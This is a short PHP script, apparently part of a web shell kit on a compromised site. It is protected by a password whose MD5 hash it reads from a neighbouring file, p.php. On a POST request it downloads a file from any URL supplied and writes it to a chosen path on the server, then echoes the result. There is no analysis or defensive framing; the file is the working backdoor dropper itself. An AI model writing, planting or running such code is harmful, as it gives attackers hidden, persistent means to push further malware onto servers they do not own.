<?php /*25.08.16
urlins7.php?s=pass~url~in
только на файлах
*/
if(!file_exists('./p.php')){exit('[X] PASS Not Exist');}
if(!isset($_POST['s'])){exit('[X]');}
$d=explode('*/',file_get_contents('./p.php'));
$d=explode('/*',$d[0]);$s=explode('~',$_POST['s']); 
if(md5($s[0])!=$d[1]){exit('[X] PASS');}$d = array();

if(!isset($s[1])){exit('[X] urlins7: not url');}
if(!isset($s[2])){exit('[X] urlins7: not in');}
if(file_exists($s[2])){exit('[X] urlins7: in exist');}
	if(copy($s[1],$s[2])){
		echo '[V]';
	}else{
		echo '[X]';
	}
echo ' urlins7';
for($i=1;$i<count($s);$i++){
	echo '~'.$s[$i];
}


?>